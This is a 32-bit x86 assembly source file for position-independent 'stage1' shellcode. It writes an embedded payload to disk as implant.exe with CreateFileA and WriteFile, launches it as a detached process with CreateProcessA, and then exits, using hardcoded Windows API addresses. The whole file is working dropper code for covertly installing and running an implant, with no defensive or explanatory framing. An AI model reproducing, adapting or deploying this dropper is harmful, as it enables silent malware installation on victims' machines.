BITS 32

segment .data

GLOBAL _start_stage1@0 ;;stdcall
_start_stage1@0:


_PIC_BYTES:

	pushad
	jmp .getData


	.loadImplant:
		pop esi


		.CreateFileA:
		push DWORD 0x0		; hTemplateFile (NULL)
		push DWORD 0x80		; dwFlagsAndAttributes (FILE_ATTRIBUTE_NORMAL)
		push DWORD 0x2		; dwCreationDisposition (CREATE_ALWAYS)
		push DWORD 0x0		; lpSecurityAttributes (NULL)
		push DWORD 0x3		; dwShareMode (FILE_SHARE_READ | FILE_SHARE_WRITE)
		push 0x10000000		; dwDesiredAccess (GENERIC_ALL)
		push esi					; lpFileName
		mov eax, [esi + PIC_DATA_OFFSET_CFA_ADDR] ; Address of CreateFileA
		call eax



		mov [esi + PIC_DATA_OFFSET_HANDLE], eax	  ; Save File Handle

		.WriteFile:
		push DWORD 0x0								; lpOverlapped (NULL)
		lea ebx, [esi+PIC_DATA_OFFSET_OUTVAR]		; lpNumberOfBytesWritten (&outvar)
		push ebx
		lea ebx, [esi+PIC_DATA_OFFSET_PIC_SIZE+4]	; nNumberOfBytesToWrite (implant size in bytes)
		push DWORD [ebx]
		lea ebx, [esi+PIC_DATA_OFFSET_PIC_SIZE+8]	; lpBuffer (Start of implant)
		push ebx
		push eax									; File Handle from previous call
		mov ebx, [esi+PIC_DATA_OFFSET_WF_ADDR]		; address of WriteFile
		call ebx


		.CloseHandle:
		mov eax, [esi+PIC_DATA_OFFSET_HANDLE]		; File Handle
		push eax
		mov eax, [esi+PIC_DATA_OFFSET_CH_ADDR]
		call eax


		.CreateProcessA:
		lea eax, [esi+PIC_DATA_OFFSET_PROCESS_INFORMATION]	; lpProcessInformation [out]
		push eax
		lea eax, [esi+PIC_DATA_OFFSET_STARTUPIFNO]					; lpStartupInfo [in]
		push eax
		push DWORD 0x0										; lpCurrentDirectory (NULL)
		push DWORD 0x0										; lpEnvironment (NULL)
		push DWORD 0x8										; dwCreationFlags (DETACHED_PROCESS)
		push DWORD 0x0										; bInheritHandles (FALSE)
		push DWORD 0x0										; lpThreadAttributes (NULL)
		push DWORD 0x0										; lpProcessAttributes (NULL)
		push DWORD 0x0										; lpCommandLine (NULL)
		lea eax, [esi+PIC_DATA_OFFSET_ABSOLUTE_STR]			; lpProcessAttributes ("implant.exe") ; "notepad.exe" ?
		push eax
		mov eax, [esi+PIC_DATA_OFFSET_CPA_ADDR]					; Address of CreateFileA
		call eax


		.CleanUp:
		xor eax, eax
		push eax
		mov eax, [esi+PIC_DATA_OFFSET_EP] ;; ExitProcess
		call eax


	.getData:
		call .loadImplant


PIC_DATA_OFFSET_0:
_PIC_FILE_STR db "implant.exe", 0x0

PIC_DATA_OFFSET_ABSOLUTE_STR equ $-PIC_DATA_OFFSET_0:
_PIC_FILE_ABSOLUTE_STR db "C:\\implant.exe", 0x0

PIC_DATA_OFFSET_HANDLE equ $-PIC_DATA_OFFSET_0:
_PIC_HANDLE dd 0

PIC_DATA_OFFSET_OUTVAR equ $-PIC_DATA_OFFSET_0:
_PIC_OUTVAR dd 0

PIC_DATA_OFFSET_CFA_ADDR equ $-PIC_DATA_OFFSET_0:
_PIC_CFA_ADDR dd 0x7c801a24

PIC_DATA_OFFSET_WF_ADDR equ $-PIC_DATA_OFFSET_0:
_PIC_WF_ADDR dd 0x7c810f9f

PIC_DATA_OFFSET_CPA_ADDR equ $-PIC_DATA_OFFSET_0:
_PIC_RFA_ADDR dd 0x7c802367

PIC_DATA_OFFSET_CH_ADDR equ $-PIC_DATA_OFFSET_0:
_PIC_CH_ADDR dd 0x7c809b77

PIC_DATA_OFFSET_GSIA equ $-PIC_DATA_OFFSET_0:
_PIC_GSIA_ADDR dd 0x7c801eee

PIC_DATA_OFFSET_EP equ $-PIC_DATA_OFFSET_0:
_PIC_EP_ADDR dd 0x7c81caa2

PIC_DATA_OFFSET_STARTUPIFNO equ $-PIC_DATA_OFFSET_0:
_PIC_STARTUPIFNO TIMES 68 db 0

PIC_DATA_OFFSET_PROCESS_INFORMATION equ $-PIC_DATA_OFFSET_0:
_PIC_PROC_INFO TIMES 16 db 0

PIC_DATA_OFFSET_PIC_SIZE equ $-PIC_DATA_OFFSET_0:
_SIZE_OF_PIC dd $-_PIC_BYTES
